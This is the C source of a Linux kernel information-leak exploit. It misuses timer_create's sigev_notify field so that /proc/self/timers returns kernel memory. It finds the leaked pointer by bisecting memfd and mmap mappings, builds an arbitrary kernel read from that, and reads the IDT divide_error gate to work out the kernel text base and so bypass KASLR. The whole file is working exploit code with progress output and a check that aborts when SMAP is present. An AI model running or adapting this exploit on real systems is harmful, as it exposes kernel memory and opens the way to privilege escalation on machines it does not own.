#define _GNU_SOURCE

#include <assert.h>
#include <ctype.h>
#include <fcntl.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/sysinfo.h>
#include <sys/syscall.h>
#include <sys/types.h>

// TODO IS this right on 4.8.0-58-generic?
#define O_DIVIDE_ERROR			0x89B580

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#define DEBUG 2

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#ifndef SYS_memfd_create
#define SYS_memfd_create	319
#endif

#define PAGE_SHIFT		12
#define PAGE_SIZE		(1ul << PAGE_SHIFT)
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#define LOG_INFO	1
#define LOG_DEBUG	2

#define log(level, format, args...)					\
	do {								\
		if (level == LOG_INFO)					\
			printf(format, ## args);			\
		else							\
			fprintf(stderr, format, ## args);		\
	} while(0)

#define info(format, args...) log(LOG_INFO, format, ## args)

#if (DEBUG >= 1)
#define debug1(format, args...) log(LOG_DEBUG, format, ## args)
#else
#define debug1(format, args...)
#endif

#if (DEBUG >= 2)
#define debug2(format, args...) log(LOG_DEBUG, format, ## args)
#else
#define debug2(format, args...)
#endif

#define min(x, y) ((x) < (y) ? (x) : (y))

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#define MIN_KERNEL_BASE 0xffffffff81000000ul
#define MAX_KERNEL_BASE 0xffffffffff000000ul
#define MAX_KERNEL_IMAGE 0x8000000ul // 128 MB

#define MMAP_ADDR_SPAN (MAX_KERNEL_BASE - MIN_KERNEL_BASE + MAX_KERNEL_IMAGE)
#define MMAP_ADDR_START 0x200000000ul
#define MMAP_ADDR_END (MMAP_ADDR_START + MMAP_ADDR_SPAN)

#define OPTIMAL_PTR_OFFSET ((MMAP_ADDR_START - MIN_KERNEL_BASE) / 8)
// == 0x4fe00000

#define MAX_MAPPINGS 1024
#define MEMFD_SIZE (MMAP_ADDR_SPAN / MAX_MAPPINGS)

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

static struct proc_reader g_proc_reader;
static unsigned long g_leak_ptr_addr = 0;

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#define PROC_INITIAL_SIZE 1024
#define PROC_CHUNK_SIZE 1024

struct proc_reader {
	char *buffer;
	int buffer_size;
	int read_size;
};

static void proc_init(struct proc_reader* pr) {
	debug2("proc_init: %p\n", pr);

	pr->buffer = malloc(PROC_INITIAL_SIZE);
	if (pr->buffer == NULL) {
		perror("[-] proc_init: malloc()");
		exit(EXIT_FAILURE);
	}
	pr->buffer_size = PROC_INITIAL_SIZE;
	pr->read_size = 0;

	debug2("proc_init = void\n");
}

static void proc_ensure_size(struct proc_reader* pr, int size) {
	if (pr->buffer_size >= size)
		return;
	while (pr->buffer_size < size)
		pr->buffer_size <<= 1;
	pr->buffer = realloc(pr->buffer, pr->buffer_size);
	if (pr->buffer == NULL) {
		perror("[-] proc_ensure_size: realloc()");
		exit(EXIT_FAILURE);
	}
}

static int proc_read(struct proc_reader* pr, const char *file) {
	debug2("proc_read: file: %s, pr->buffer_size: %d\n",
			file, pr->buffer_size);

	int fd = open(file, O_RDONLY);
	if (fd == -1) {
		perror("[-] proc_read: open()");
		exit(EXIT_FAILURE);
	}

	pr->read_size = 0;
	while (true) {
		proc_ensure_size(pr, pr->read_size + PROC_CHUNK_SIZE);
		int bytes_read = read(fd, &pr->buffer[pr->read_size],
					PROC_CHUNK_SIZE);
		if (bytes_read == -1) {
			perror("[-] read(proc)");
			exit(EXIT_FAILURE);
		}
		pr->read_size += bytes_read;
		if (bytes_read < PROC_CHUNK_SIZE)
			break;
	}

	close(fd);

	debug2("proc_read = %d\n", pr->read_size);
	return pr->read_size;
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

typedef union k_sigval {
	int sival_int;
	void *sival_ptr;
} k_sigval_t;

#define __ARCH_SIGEV_PREAMBLE_SIZE	(sizeof(int) * 2 + sizeof(k_sigval_t))
#define SIGEV_MAX_SIZE	64
#define SIGEV_PAD_SIZE	((SIGEV_MAX_SIZE - __ARCH_SIGEV_PREAMBLE_SIZE) \
				/ sizeof(int))

typedef struct k_sigevent {
	k_sigval_t sigev_value;
	int sigev_signo;
	int sigev_notify;
	union {
		int _pad[SIGEV_PAD_SIZE];
		int _tid;

		struct {
			void (*_function)(sigval_t);
			void *_attribute;
		} _sigev_thread;
	} _sigev_un;
} k_sigevent_t;

static void leak_setup() {
	k_sigevent_t se;
	memset(&se, 0, sizeof(se));
	se.sigev_signo = SIGRTMIN;
	se.sigev_notify = OPTIMAL_PTR_OFFSET;
	timer_t timerid = 0;

	int rv = syscall(SYS_timer_create, CLOCK_REALTIME,
				(void *)&se, &timerid);
	if (rv != 0) {
		perror("[-] timer_create()");
		exit(EXIT_FAILURE);
	}
}

static void leak_parse(char *in, int in_len, char **start, char **end) {
	const char *needle = "notify: ";
	*start = memmem(in, in_len, needle, strlen(needle));
	assert(*start != NULL);
	*start += strlen(needle);

	assert(in_len > 0);
	assert(in[in_len - 1] == '\n');
	*end = &in[in_len - 2];
	while (*end > in && **end != '\n')
		(*end)--;
	assert(*end > in);
	while (*end > in && **end != '/')
		(*end)--;
	assert(*end > in);
	assert((*end)[1] = 'p' && (*end)[2] == 'i' && (*end)[3] == 'd');

	assert(*end >= *start);
}

static void leak_once(char **start, char **end) {
	int read_size = proc_read(&g_proc_reader, "/proc/self/timers");
	leak_parse(g_proc_reader.buffer, read_size, start, end);
}

static int leak_once_and_copy(char *out, int out_len) {
	assert(out_len > 0);

	char *start, *end;
	leak_once(&start, &end);

	int size = min(end - start, out_len);
	memcpy(out, start, size);

	if (size == out_len)
		return size;

	out[size] = 0;
	return size + 1;
}

static void leak_range(unsigned long addr, size_t length, char *out) {
	size_t total_leaked = 0;
	while (total_leaked < length) {
		unsigned long addr_to_leak = addr + total_leaked;
		*(unsigned long *)g_leak_ptr_addr = addr_to_leak;
		debug2("leak_range: offset %ld, addr: %lx\n",
			total_leaked, addr_to_leak);
		int leaked = leak_once_and_copy(out + total_leaked,
			length - total_leaked);
		total_leaked += leaked;
	}
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

static void mmap_fixed(unsigned long addr, size_t size) {
	void *rv = mmap((void *)addr, size, PROT_READ | PROT_WRITE,
			MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (rv != (void *)addr) {
		perror("[-] mmap()");
		exit(EXIT_FAILURE);
	}
}

static void mmap_fd_over(int fd, unsigned long fd_size, unsigned long start,
			unsigned long end) {
	int page_size = PAGE_SIZE;
	assert(fd_size % page_size == 0);
	assert(start % page_size == 0);
	assert(end % page_size == 0);
	assert((end - start) % fd_size == 0);

	debug1("mmap_fd_over: [%lx, %lx)\n", start, end);

	unsigned long addr;
	for (addr = start; addr < end; addr += fd_size) {
		void *rv = mmap((void *)addr, fd_size, PROT_READ,
				MAP_FIXED | MAP_PRIVATE, fd, 0);
		if (rv != (void *)addr) {
			perror("[-] mmap()");
			exit(EXIT_FAILURE);
		}
	}

	debug1("mmap_fd_over = void\n");
}

static void remap_fd_over(int fd, unsigned long fd_size, unsigned long start,
			unsigned long end) {
	int rv = munmap((void *)start, end - start);
	if (rv != 0) {
		perror("[-] munmap()");
		exit(EXIT_FAILURE);
	}
	mmap_fd_over(fd, fd_size, start, end);
}

#define MEMFD_CHUNK_SIZE 0x1000

static int create_filled_memfd(const char *name, unsigned long size,
				unsigned long value) {
	int i;
	char buffer[MEMFD_CHUNK_SIZE];

	assert(size % MEMFD_CHUNK_SIZE == 0);

	int fd = syscall(SYS_memfd_create, name, 0);
	if (fd < 0) {
		perror("[-] memfd_create()");
		exit(EXIT_FAILURE);
	}

	for (i = 0; i < sizeof(buffer) / sizeof(value); i++)
		*(unsigned long *)&buffer[i * sizeof(value)] = value;

	for (i = 0; i < size / sizeof(buffer); i++) {
		int bytes_written = write(fd, &buffer[0], sizeof(buffer));
		if (bytes_written != sizeof(buffer)) {
			perror("[-] write(memfd)");
			exit(EXIT_FAILURE);
		}
	}

	return fd;
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

static const char *evil = "evil";
static const char *good = "good";

static bool bisect_probe() {
	char *start, *end;
	leak_once(&start, &end);
	return *start == 'g';
}

static unsigned long bisect_via_memfd(unsigned long fd_size,
				unsigned long start, unsigned long end) {
	assert((end - start) % fd_size == 0);

	int fd_evil = create_filled_memfd("evil", fd_size, (unsigned long)evil);
	int fd_good = create_filled_memfd("good", fd_size, (unsigned long)good);

	unsigned long left = 0;
	unsigned long right = (end - start) / fd_size;

	while (right - left > 1) {
		unsigned long middle = left + (right - left) / 2;
		remap_fd_over(fd_evil, fd_size, start + left * fd_size,
				start + middle * fd_size);
		remap_fd_over(fd_good, fd_size, start + middle * fd_size,
				start + right * fd_size);
		bool probe = bisect_probe();
		if (probe)
			left = middle;
		else
			right = middle;
	}

	int rv = munmap((void *)start, end - start);
	if (rv != 0) {
		perror("[-] munmap()");
		exit(EXIT_FAILURE);
	}

	close(fd_evil);
	close(fd_good);

	return start + left * fd_size;
}

static unsigned long bisect_via_assign(unsigned long start, unsigned long end) {
	int word_size = sizeof(unsigned long);

	assert((end - start) % word_size == 0);
	assert((end - start) % PAGE_SIZE == 0);

	mmap_fixed(start, end - start);

	unsigned long left = 0;
	unsigned long right = (end - start) / word_size;

	while (right - left > 1) {
		unsigned long middle = left + (right - left) / 2;
		unsigned long a;
		for (a = left; a < middle; a++)
			*(unsigned long *)(start + a * word_size) =
				(unsigned long)evil;
		for (a = middle; a < right; a++)
			*(unsigned long *)(start + a * word_size) =
				(unsigned long)good;
		bool probe = bisect_probe();
		if (probe)
			left = middle;
		else
			right = middle;
	}

	int rv = munmap((void *)start, end - start);
	if (rv != 0) {
		perror("[-] munmap()");
		exit(EXIT_FAILURE);
	}

	return start + left * word_size;
}

static unsigned long bisect_leak_ptr_addr() {
	unsigned long addr = bisect_via_memfd(
			MEMFD_SIZE, MMAP_ADDR_START, MMAP_ADDR_END);
	debug1("%lx %lx\n", addr, addr + MEMFD_SIZE);
	addr = bisect_via_memfd(PAGE_SIZE, addr, addr + MEMFD_SIZE);
	debug1("%lx %lx\n", addr, addr + PAGE_SIZE);
	addr = bisect_via_assign(addr, addr + PAGE_SIZE);
	debug1("%lx\n", addr);
	return addr;
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#define CPUINFO_SMEP	1
#define CPUINFO_SMAP	2
#define CPUINFO_KAISER	4
#define CPUINFO_PTI	8

static int cpuinfo_scan() {
	int length = proc_read(&g_proc_reader, "/proc/cpuinfo");
	char *buffer = &g_proc_reader.buffer[0];
	int rv = 0;
	char* found = memmem(buffer, length, "smep", 4);
	if (found != NULL)
		rv |= CPUINFO_SMEP;
	found = memmem(buffer, length, "smap", 4);
	if (found != NULL)
		rv |= CPUINFO_SMAP;
	found = memmem(buffer, length, "kaiser", 4);
	if (found != NULL)
		rv |= CPUINFO_KAISER;
	found = memmem(buffer, length, " pti", 4);
	if (found != NULL)
		rv |= CPUINFO_PTI;
	return rv;
}

static void cpuinfo_check() {
	int rv = cpuinfo_scan();
	if (rv & CPUINFO_SMAP) {
		info("[-] SMAP detected, no bypass available, aborting\n");
		exit(EXIT_FAILURE);
	}
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

static void arbitrary_read_init() {
	info("[.] setting up proc reader\n");
	proc_init(&g_proc_reader);
	info("[~] done\n");

	info("[.] checking /proc/cpuinfo\n");
	cpuinfo_check();
	info("[~] looks good\n");

	info("[.] setting up timer\n");
	leak_setup();
	info("[~] done\n");

	info("[.] finding leak pointer address\n");
	g_leak_ptr_addr = bisect_leak_ptr_addr();
	info("[+] done: %016lx\n", g_leak_ptr_addr);

	info("[.] mapping leak pointer page\n");
	mmap_fixed(g_leak_ptr_addr & ~(PAGE_SIZE - 1), PAGE_SIZE);
	info("[~] done\n");
}

static void read_range(unsigned long addr, size_t length, char *buffer) {
	leak_range(addr, length, buffer);
}

static uint64_t read_8(unsigned long addr) {
	uint64_t result;
	read_range(addr, sizeof(result), (char *)&result);
	return result;
}

static uint32_t read_4(unsigned long addr) {
	uint32_t result;
	read_range(addr, sizeof(result), (char *)&result);
	return result;
}

static uint64_t read_field_8(unsigned long addr, int offset) {
	return read_8(addr + offset);
}

static uint64_t read_field_4(unsigned long addr, int offset) {
	return read_4(addr + offset);
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

struct idt_register {
	uint16_t length;
	uint64_t base;
} __attribute__((packed));

struct idt_gate {
	uint16_t offset_1; // bits 0..15
	uint32_t shit_1;
	uint16_t offset_2; // bits 16..31
	uint32_t offset_3; // bits 32..63
	uint32_t shit_2;
} __attribute__((packed));

static uint64_t idt_gate_addr(struct idt_gate *gate) {
	uint64_t addr = gate->offset_1 + ((uint64_t)gate->offset_2 << 16) +
		((uint64_t)gate->offset_3 << 32);
	return addr;
}

static void get_idt(struct idt_register *idtr) {
	asm ( "sidt %0" : : "m"(*idtr) );
	debug1("get_idt_base: base: %016lx, length: %d\n",
			idtr->base, idtr->length);
}

static uint64_t read_idt_gate(int i) {
	char buffer[4096];
	struct idt_register idtr;

	get_idt(&idtr);
	assert(idtr.length <= sizeof(buffer));
	assert(i <= idtr.length / sizeof(struct idt_gate));
	read_range(idtr.base, idtr.length, &buffer[0]);

	struct idt_gate *gate = (struct idt_gate *)&buffer[0] + i;
	uint64_t addr = idt_gate_addr(gate);
	return addr;
}


static unsigned long g_kernel_text = 0;
int main(int argc, char **argv) {
	assert(getpagesize() == PAGE_SIZE);   // KM: why?

	arbitrary_read_init();

	unsigned long divide_error = read_idt_gate(0);
	info("[.] divide_error:     %016lx\n", divide_error);

	g_kernel_text = divide_error - O_DIVIDE_ERROR;
	info("[.] kernel text:      %016lx\n", g_kernel_text);

	return EXIT_SUCCESS;
}
